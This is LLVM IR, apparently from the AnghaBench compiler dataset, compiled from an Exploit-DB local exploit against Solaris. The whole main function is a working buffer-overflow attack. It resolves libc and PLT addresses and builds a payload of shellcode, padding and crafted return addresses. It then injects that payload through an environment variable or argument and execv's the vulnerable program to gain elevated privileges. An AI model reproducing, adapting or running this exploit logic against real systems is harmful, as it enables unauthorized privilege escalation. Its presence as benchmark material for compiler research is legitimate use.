; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/solaris/local/extr_19160.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/solaris/local/extr_19160.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [17 x i8] c"/usr/lib/libc.so\00", align 1
@.str.1 = private unnamed_addr constant [12 x i8] c"_exithandle\00", align 1
@prog = common dso_local global i8* null, align 8
@.str.2 = private unnamed_addr constant [9 x i8] c"l:f:o:e:\00", align 1
@EOF = common dso_local global i32 0, align 4
@optarg = external dso_local global i8*, align 8
@optind = external dso_local global i32, align 4
@stderr = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [44 x i8] c"%s: impossible library virtual address: %s\0A\00", align 1
@.str.4 = private unnamed_addr constant [26 x i8] c"Using library %s at 0x%p\0A\00", align 1
@PLT_SYMBOL = common dso_local global i8* null, align 8
@.str.5 = private unnamed_addr constant [44 x i8] c"%s: could not find PLT offset from library\0A\00", align 1
@.str.6 = private unnamed_addr constant [19 x i8] c"Using PLT at 0x%p\0A\00", align 1
@.str.7 = private unnamed_addr constant [41 x i8] c"%s: impossible offset from PLT returned\0A\00", align 1
@.str.8 = private unnamed_addr constant [18 x i8] c"Found %s at 0x%p\0A\00", align 1
@.str.9 = private unnamed_addr constant [32 x i8] c"%s: illegal buffer address: %s\0A\00", align 1
@.str.10 = private unnamed_addr constant [16 x i8] c"Buffer at 0x%p\0A\00", align 1
@.str.11 = private unnamed_addr constant [6 x i8] c"__iob\00", align 1
@.str.12 = private unnamed_addr constant [32 x i8] c"%s: could not find iob[] in %s\0A\00", align 1
@.str.13 = private unnamed_addr constant [15 x i8] c"iob[] at 0x%p\0A\00", align 1
@shell_len = common dso_local global i32 0, align 4
@.str.14 = private unnamed_addr constant [37 x i8] c"%s: not enough space for shell code\0A\00", align 1
@.str.15 = private unnamed_addr constant [23 x i8] c"%s: alignment problem\0A\00", align 1
@.str.16 = private unnamed_addr constant [19 x i8] c"%s: out of memory\0A\00", align 1
@.str.17 = private unnamed_addr constant [4 x i8] c"%s=\00", align 1
@shellcode = common dso_local global i32* null, align 8
@meow = common dso_local global i32 0, align 4
@.str.18 = private unnamed_addr constant [29 x i8] c"Using absolute address 0x%p\0A\00", align 1
@.str.19 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.20 = private unnamed_addr constant [16 x i8] c"Using %d bytes\0A\00", align 1
@.str.21 = private unnamed_addr constant [6 x i8] c"execv\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i64, align 8
  %10 = alloca i64, align 8
  %11 = alloca i64, align 8
  %12 = alloca i64, align 8
  %13 = alloca i64, align 8
  %14 = alloca i64, align 8
  %15 = alloca i64, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i8*, align 8
  %20 = alloca i64*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i8**, align 8
  %23 = alloca i8**, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* null, i8** %6, align 8
  store i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str, i64 0, i64 0), i8** %7, align 8
  store i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.1, i64 0, i64 0), i8** %8, align 8
  store i64 0, i64* %10, align 8
  %24 = load i8**, i8*** %5, align 8
  %25 = getelementptr inbounds i8*, i8** %24, i64 0
  %26 = load i8*, i8** %25, align 8
  %27 = call i8* @strrchr(i8* %26, i8 signext 47)
  store i8* %27, i8** @prog, align 8
  %28 = load i8*, i8** @prog, align 8
  %29 = icmp ne i8* %28, null
  br i1 %29, label %30, label %33

30:                                               ; preds = %2
  %31 = load i8*, i8** @prog, align 8
  %32 = getelementptr inbounds i8, i8* %31, i32 1
  store i8* %32, i8** @prog, align 8
  br label %37

33:                                               ; preds = %2
  %34 = load i8**, i8*** %5, align 8
  %35 = getelementptr inbounds i8*, i8** %34, i64 0
  %36 = load i8*, i8** %35, align 8
  store i8* %36, i8** @prog, align 8
  br label %37

37:                                               ; preds = %33, %30
  br label %38

38:                                               ; preds = %57, %37
  %39 = load i32, i32* %4, align 4
  %40 = load i8**, i8*** %5, align 8
  %41 = call i32 @getopt(i32 %39, i8** %40, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.2, i64 0, i64 0))
  store i32 %41, i32* %21, align 4
  %42 = load i32, i32* @EOF, align 4
  %43 = icmp ne i32 %41, %42
  br i1 %43, label %44, label %58

44:                                               ; preds = %38
  %45 = load i32, i32* %21, align 4
  switch i32 %45, label %55 [
    i32 108, label %46
    i32 102, label %48
    i32 111, label %50
    i32 101, label %53
  ]

46:                                               ; preds = %44
  %47 = load i8*, i8** @optarg, align 8
  store i8* %47, i8** %7, align 8
  br label %57

48:                                               ; preds = %44
  %49 = load i8*, i8** @optarg, align 8
  store i8* %49, i8** %8, align 8
  br label %57

50:                                               ; preds = %44
  %51 = load i8*, i8** @optarg, align 8
  %52 = call i64 @strtol(i8* %51, i8** null, i32 0)
  store i64 %52, i64* %10, align 8
  br label %57

53:                                               ; preds = %44
  %54 = load i8*, i8** @optarg, align 8
  store i8* %54, i8** %6, align 8
  br label %57

55:                                               ; preds = %44
  %56 = call i32 (...) @usage()
  br label %57

57:                                               ; preds = %55, %53, %50, %48, %46
  br label %38

58:                                               ; preds = %38
  %59 = load i32, i32* %4, align 4
  %60 = load i32, i32* @optind, align 4
  %61 = sub nsw i32 %59, %60
  %62 = icmp slt i32 %61, 3
  br i1 %62, label %63, label %65

63:                                               ; preds = %58
  %64 = call i32 (...) @usage()
  br label %65

65:                                               ; preds = %63, %58
  %66 = load i8**, i8*** %5, align 8
  %67 = load i32, i32* @optind, align 4
  %68 = sext i32 %67 to i64
  %69 = getelementptr inbounds i8*, i8** %66, i64 %68
  %70 = load i8*, i8** %69, align 8
  store i8* %70, i8** %17, align 8
  %71 = load i8**, i8*** %5, align 8
  %72 = load i32, i32* @optind, align 4
  %73 = add nsw i32 %72, 1
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds i8*, i8** %71, i64 %74
  %76 = load i8*, i8** %75, align 8
  %77 = call i64 @strtoul(i8* %76, i8** null, i32 0)
  store i64 %77, i64* %11, align 8
  %78 = load i64, i64* %11, align 8
  %79 = icmp eq i64 %78, 0
  br i1 %79, label %80, label %91

80:                                               ; preds = %65
  %81 = load i32, i32* @stderr, align 4
  %82 = load i8*, i8** @prog, align 8
  %83 = load i8**, i8*** %5, align 8
  %84 = load i32, i32* @optind, align 4
  %85 = add nsw i32 %84, 1
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds i8*, i8** %83, i64 %86
  %88 = load i8*, i8** %87, align 8
  %89 = call i32 (i32, i8*, i8*, ...) @fprintf(i32 %81, i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.3, i64 0, i64 0), i8* %82, i8* %88)
  %90 = call i32 @exit(i32 1) #3
  unreachable

91:                                               ; preds = %65
  %92 = load i8*, i8** %7, align 8
  %93 = load i64, i64* %11, align 8
  %94 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.4, i64 0, i64 0), i8* %92, i64 %93)
  %95 = load i8**, i8*** %5, align 8
  %96 = load i32, i32* @optind, align 4
  %97 = add nsw i32 %96, 2
  %98 = sext i32 %97 to i64
  %99 = getelementptr inbounds i8*, i8** %95, i64 %98
  %100 = load i8*, i8** %99, align 8
  store i8* %100, i8** %16, align 8
  %101 = load i8**, i8*** %5, align 8
  %102 = load i32, i32* @optind, align 4
  %103 = add nsw i32 %102, 3
  %104 = sext i32 %103 to i64
  %105 = getelementptr inbounds i8*, i8** %101, i64 %104
  store i8** %105, i8*** %22, align 8
  %106 = load i8*, i8** %7, align 8
  %107 = load i8*, i8** @PLT_SYMBOL, align 8
  %108 = call i64 @symval(i8* %106, i8* %107)
  store i64 %108, i64* %12, align 8
  %109 = load i64, i64* %12, align 8
  %110 = icmp eq i64 %109, 0
  br i1 %110, label %111, label %116

111:                                              ; preds = %91
  %112 = load i32, i32* @stderr, align 4
  %113 = load i8*, i8** @prog, align 8
  %114 = call i32 (i32, i8*, i8*, ...) @fprintf(i32 %112, i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.5, i64 0, i64 0), i8* %113)
  %115 = call i32 @exit(i32 1) #3
  unreachable

116:                                              ; preds = %91
  %117 = load i64, i64* %12, align 8
  %118 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.6, i64 0, i64 0), i64 %117)
  %119 = load i8*, i8** %7, align 8
  %120 = load i8*, i8** %8, align 8
  %121 = call i64 @plt_offset(i8* %119, i8* %120)
  store i64 %121, i64* %9, align 8
  %122 = load i64, i64* %9, align 8
  %123 = icmp eq i64 %122, 0
  br i1 %123, label %124, label %129

124:                                              ; preds = %116
  %125 = load i32, i32* @stderr, align 4
  %126 = load i8*, i8** @prog, align 8
  %127 = call i32 (i32, i8*, i8*, ...) @fprintf(i32 %125, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.7, i64 0, i64 0), i8* %126)
  %128 = call i32 @exit(i32 1) #3
  unreachable

129:                                              ; preds = %116
  %130 = load i8*, i8** %8, align 8
  %131 = load i64, i64* %9, align 8
  %132 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.8, i64 0, i64 0), i8* %130, i64 %131)
  %133 = load i8*, i8** %17, align 8
  %134 = getelementptr inbounds i8, i8* %133, i64 0
  %135 = load i8, i8* %134, align 1
  %136 = sext i8 %135 to i32
  %137 = icmp eq i32 %136, 64
  br i1 %137, label %138, label %142

138:                                              ; preds = %129
  %139 = load i8*, i8** %17, align 8
  %140 = getelementptr inbounds i8, i8* %139, i64 1
  %141 = call i64 @strtol(i8* %140, i8** null, i32 0)
  store i64 %141, i64* %13, align 8
  br label %146

142:                                              ; preds = %129
  %143 = load i8*, i8** %16, align 8
  %144 = load i8*, i8** %17, align 8
  %145 = call i64 @symval(i8* %143, i8* %144)
  store i64 %145, i64* %13, align 8
  br label %146

146:                                              ; preds = %142, %138
  %147 = load i64, i64* %13, align 8
  %148 = icmp eq i64 %147, 0
  br i1 %148, label %149, label %155

149:                                              ; preds = %146
  %150 = load i32, i32* @stderr, align 4
  %151 = load i8*, i8** @prog, align 8
  %152 = load i8*, i8** %16, align 8
  %153 = call i32 (i32, i8*, i8*, ...) @fprintf(i32 %150, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.9, i64 0, i64 0), i8* %151, i8* %152)
  %154 = call i32 @exit(i32 1) #3
  unreachable

155:                                              ; preds = %146
  %156 = load i64, i64* %13, align 8
  %157 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.10, i64 0, i64 0), i64 %156)
  %158 = load i8*, i8** %16, align 8
  %159 = call i64 @symval(i8* %158, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.11, i64 0, i64 0))
  store i64 %159, i64* %14, align 8
  %160 = load i64, i64* %14, align 8
  %161 = icmp eq i64 %160, 0
  br i1 %161, label %162, label %168

162:                                              ; preds = %155
  %163 = load i32, i32* @stderr, align 4
  %164 = load i8*, i8** @prog, align 8
  %165 = load i8*, i8** %16, align 8
  %166 = call i32 (i32, i8*, i8*, ...) @fprintf(i32 %163, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.12, i64 0, i64 0), i8* %164, i8* %165)
  %167 = call i32 @exit(i32 1) #3
  unreachable

168:                                              ; preds = %155
  %169 = load i64, i64* %14, align 8
  %170 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.13, i64 0, i64 0), i64 %169)
  %171 = load i64, i64* %11, align 8
  %172 = load i64, i64* %12, align 8
  %173 = add nsw i64 %171, %172
  %174 = load i64, i64* %9, align 8
  %175 = add nsw i64 %173, %174
  store i64 %175, i64* %15, align 8
  %176 = load i64, i64* %14, align 8
  %177 = load i64, i64* %13, align 8
  %178 = sub nsw i64 %176, %177
  %179 = trunc i64 %178 to i32
  store i32 %179, i32* %18, align 4
  %180 = load i32, i32* %18, align 4
  %181 = load i32, i32* @shell_len, align 4
  %182 = icmp slt i32 %180, %181
  br i1 %182, label %183, label %188

183:                                              ; preds = %168
  %184 = load i32, i32* @stderr, align 4
  %185 = load i8*, i8** @prog, align 8
  %186 = call i32 (i32, i8*, i8*, ...) @fprintf(i32 %184, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.14, i64 0, i64 0), i8* %185)
  %187 = call i32 @exit(i32 1) #3
  unreachable

188:                                              ; preds = %168
  %189 = load i8*, i8** %6, align 8
  %190 = icmp ne i8* %189, null
  br i1 %190, label %191, label %208

191:                                              ; preds = %188
  %192 = load i8*, i8** %6, align 8
  %193 = call i64 @strlen(i8* %192)
  %194 = add i64 %193, 5
  %195 = load i32, i32* %18, align 4
  %196 = sext i32 %195 to i64
  %197 = add i64 %196, %194
  %198 = trunc i64 %197 to i32
  store i32 %198, i32* %18, align 4
  %199 = load i32, i32* %18, align 4
  %200 = and i32 %199, 3
  %201 = icmp ne i32 %200, 0
  br i1 %201, label %202, label %207

202:                                              ; preds = %191
  %203 = load i32, i32* @stderr, align 4
  %204 = load i8*, i8** @prog, align 8
  %205 = call i32 (i32, i8*, i8*, ...) @fprintf(i32 %203, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.15, i64 0, i64 0), i8* %204)
  %206 = call i32 @exit(i32 1) #3
  unreachable

207:                                              ; preds = %191
  br label %208

208:                                              ; preds = %207, %188
  %209 = load i32, i32* %18, align 4
  %210 = call i64 @malloc(i32 %209)
  %211 = inttoptr i64 %210 to i8*
  store i8* %211, i8** %19, align 8
  %212 = load i8*, i8** %19, align 8
  %213 = icmp eq i8* %212, null
  br i1 %213, label %214, label %219

214:                                              ; preds = %208
  %215 = load i32, i32* @stderr, align 4
  %216 = load i8*, i8** @prog, align 8
  %217 = call i32 (i32, i8*, i8*, ...) @fprintf(i32 %215, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.16, i64 0, i64 0), i8* %216)
  %218 = call i32 @exit(i32 1) #3
  unreachable

219:                                              ; preds = %208
  %220 = load i8*, i8** %6, align 8
  %221 = icmp ne i8* %220, null
  br i1 %221, label %222, label %238

222:                                              ; preds = %219
  %223 = load i8*, i8** %6, align 8
  %224 = call i64 @strlen(i8* %223)
  %225 = add i64 %224, 5
  %226 = load i32, i32* %18, align 4
  %227 = sext i32 %226 to i64
  %228 = sub i64 %227, %225
  %229 = trunc i64 %228 to i32
  store i32 %229, i32* %18, align 4
  %230 = load i8*, i8** %19, align 8
  %231 = load i8*, i8** %6, align 8
  %232 = call i32 @sprintf(i8* %230, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.17, i64 0, i64 0), i8* %231)
  %233 = load i8*, i8** %19, align 8
  %234 = load i8*, i8** %19, align 8
  %235 = call i64 @strlen(i8* %234)
  %236 = getelementptr inbounds i8, i8* %233, i64 %235
  %237 = bitcast i8* %236 to i64*
  store i64* %237, i64** %20, align 8
  br label %241

238:                                              ; preds = %219
  %239 = load i8*, i8** %19, align 8
  %240 = bitcast i8* %239 to i64*
  store i64* %240, i64** %20, align 8
  br label %241

241:                                              ; preds = %238, %222
  %242 = load i32, i32* %18, align 4
  %243 = sext i32 %242 to i64
  %244 = udiv i64 %243, 8
  %245 = trunc i64 %244 to i32
  store i32 %245, i32* %18, align 4
  store i32 0, i32* %21, align 4
  br label %246

246:                                              ; preds = %259, %241
  %247 = load i32, i32* %21, align 4
  %248 = load i32, i32* @shell_len, align 4
  %249 = icmp slt i32 %247, %248
  br i1 %249, label %250, label %262

250:                                              ; preds = %246
  %251 = load i32*, i32** @shellcode, align 8
  %252 = load i32, i32* %21, align 4
  %253 = sext i32 %252 to i64
  %254 = getelementptr inbounds i32, i32* %251, i64 %253
  %255 = load i32, i32* %254, align 4
  %256 = sext i32 %255 to i64
  %257 = load i64*, i64** %20, align 8
  %258 = getelementptr inbounds i64, i64* %257, i32 1
  store i64* %258, i64** %20, align 8
  store i64 %256, i64* %257, align 8
  br label %259

259:                                              ; preds = %250
  %260 = load i32, i32* %21, align 4
  %261 = add nsw i32 %260, 1
  store i32 %261, i32* %21, align 4
  br label %246

262:                                              ; preds = %246
  br label %263

263:                                              ; preds = %272, %262
  %264 = load i32, i32* %21, align 4
  %265 = load i32, i32* %18, align 4
  %266 = icmp slt i32 %264, %265
  br i1 %266, label %267, label %275

267:                                              ; preds = %263
  %268 = load i32, i32* @meow, align 4
  %269 = sext i32 %268 to i64
  %270 = load i64*, i64** %20, align 8
  %271 = getelementptr inbounds i64, i64* %270, i32 1
  store i64* %271, i64** %20, align 8
  store i64 %269, i64* %270, align 8
  br label %272

272:                                              ; preds = %267
  %273 = load i32, i32* %21, align 4
  %274 = add nsw i32 %273, 1
  store i32 %274, i32* %21, align 4
  br label %263

275:                                              ; preds = %263
  %276 = load i64*, i64** %20, align 8
  %277 = getelementptr inbounds i64, i64* %276, i32 1
  store i64* %277, i64** %20, align 8
  store i64 -29, i64* %276, align 8
  %278 = load i64*, i64** %20, align 8
  %279 = getelementptr inbounds i64, i64* %278, i32 1
  store i64* %279, i64** %20, align 8
  store i64 4017976080, i64* %278, align 8
  %280 = load i64*, i64** %20, align 8
  %281 = getelementptr inbounds i64, i64* %280, i32 1
  store i64* %281, i64** %20, align 8
  store i64 4017976051, i64* %280, align 8
  %282 = load i64*, i64** %20, align 8
  %283 = getelementptr inbounds i64, i64* %282, i32 1
  store i64* %283, i64** %20, align 8
  store i64 16908287, i64* %282, align 8
  %284 = load i64*, i64** %20, align 8
  %285 = getelementptr inbounds i64, i64* %284, i32 1
  store i64* %285, i64** %20, align 8
  store i64 -29, i64* %284, align 8
  %286 = load i64, i64* %15, align 8
  %287 = load i64, i64* %10, align 8
  %288 = sub nsw i64 %286, %287
  %289 = load i64*, i64** %20, align 8
  %290 = getelementptr inbounds i64, i64* %289, i32 1
  store i64* %290, i64** %20, align 8
  store i64 %288, i64* %289, align 8
  %291 = load i64, i64* %15, align 8
  %292 = sub nsw i64 %291, 29
  %293 = load i64*, i64** %20, align 8
  %294 = getelementptr inbounds i64, i64* %293, i32 1
  store i64* %294, i64** %20, align 8
  store i64 %292, i64* %293, align 8
  %295 = load i64*, i64** %20, align 8
  %296 = getelementptr inbounds i64, i64* %295, i32 1
  store i64* %296, i64** %20, align 8
  store i64 33685503, i64* %295, align 8
  %297 = load i64*, i64** %20, align 8
  %298 = getelementptr inbounds i64, i64* %297, i32 1
  store i64* %298, i64** %20, align 8
  store i64 -29, i64* %297, align 8
  %299 = load i64, i64* %15, align 8
  %300 = load i64, i64* %10, align 8
  %301 = sub nsw i64 %299, %300
  %302 = load i64*, i64** %20, align 8
  %303 = getelementptr inbounds i64, i64* %302, i32 1
  store i64* %303, i64** %20, align 8
  store i64 %301, i64* %302, align 8
  %304 = load i64, i64* %15, align 8
  %305 = sub nsw i64 %304, 29
  %306 = load i64*, i64** %20, align 8
  %307 = getelementptr inbounds i64, i64* %306, i32 1
  store i64* %307, i64** %20, align 8
  store i64 %305, i64* %306, align 8
  %308 = load i64*, i64** %20, align 8
  %309 = getelementptr inbounds i64, i64* %308, i32 1
  store i64* %309, i64** %20, align 8
  store i64 33751039, i64* %308, align 8
  %310 = load i64*, i64** %20, align 8
  %311 = getelementptr inbounds i64, i64* %310, i32 1
  store i64* %311, i64** %20, align 8
  store i64 0, i64* %310, align 8
  %312 = load i64, i64* %15, align 8
  %313 = load i64, i64* %10, align 8
  %314 = sub nsw i64 %312, %313
  %315 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.18, i64 0, i64 0), i64 %314)
  %316 = load i8*, i8** %6, align 8
  %317 = icmp ne i8* %316, null
  br i1 %317, label %318, label %321

318:                                              ; preds = %275
  %319 = load i8*, i8** %19, align 8
  %320 = call i32 @putenv(i8* %319)
  br label %345

321:                                              ; preds = %275
  %322 = load i8**, i8*** %22, align 8
  store i8** %322, i8*** %23, align 8
  br label %323

323:                                              ; preds = %341, %321
  %324 = load i8**, i8*** %23, align 8
  %325 = icmp ne i8** %324, null
  br i1 %325, label %326, label %330

326:                                              ; preds = %323
  %327 = load i8**, i8*** %23, align 8
  %328 = load i8*, i8** %327, align 8
  %329 = icmp ne i8* %328, null
  br label %330

330:                                              ; preds = %326, %323
  %331 = phi i1 [ false, %323 ], [ %329, %326 ]
  br i1 %331, label %332, label %344

332:                                              ; preds = %330
  %333 = load i8**, i8*** %23, align 8
  %334 = load i8*, i8** %333, align 8
  %335 = call i64 @strcmp(i8* %334, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.19, i64 0, i64 0))
  %336 = icmp eq i64 %335, 0
  br i1 %336, label %337, label %340

337:                                              ; preds = %332
  %338 = load i8*, i8** %19, align 8
  %339 = load i8**, i8*** %23, align 8
  store i8* %338, i8** %339, align 8
  br label %340

340:                                              ; preds = %337, %332
  br label %341

341:                                              ; preds = %340
  %342 = load i8**, i8*** %23, align 8
  %343 = getelementptr inbounds i8*, i8** %342, i32 1
  store i8** %343, i8*** %23, align 8
  br label %323

344:                                              ; preds = %330
  br label %345

345:                                              ; preds = %344, %318
  %346 = load i32, i32* %18, align 4
  %347 = mul nsw i32 %346, 4
  %348 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.20, i64 0, i64 0), i32 %347)
  %349 = load i8*, i8** %16, align 8
  %350 = load i8**, i8*** %22, align 8
  %351 = call i64 @execv(i8* %349, i8** %350)
  %352 = icmp slt i64 %351, 0
  br i1 %352, label %353, label %356

353:                                              ; preds = %345
  %354 = call i32 @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.21, i64 0, i64 0))
  %355 = call i32 @exit(i32 1) #3
  unreachable

356:                                              ; preds = %345
  %357 = load i32, i32* %3, align 4
  ret i32 %357
}

declare dso_local i8* @strrchr(i8*, i8 signext) #1

declare dso_local i32 @getopt(i32, i8**, i8*) #1

declare dso_local i64 @strtol(i8*, i8**, i32) #1

declare dso_local i32 @usage(...) #1

declare dso_local i64 @strtoul(i8*, i8**, i32) #1

declare dso_local i32 @fprintf(i32, i8*, i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i64 @symval(i8*, i8*) #1

declare dso_local i64 @plt_offset(i8*, i8*) #1

declare dso_local i64 @strlen(i8*) #1

declare dso_local i64 @malloc(i32) #1

declare dso_local i32 @sprintf(i8*, i8*, i8*) #1

declare dso_local i32 @putenv(i8*) #1

declare dso_local i64 @strcmp(i8*, i8*) #1

declare dso_local i64 @execv(i8*, i8**) #1

declare dso_local i32 @perror(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
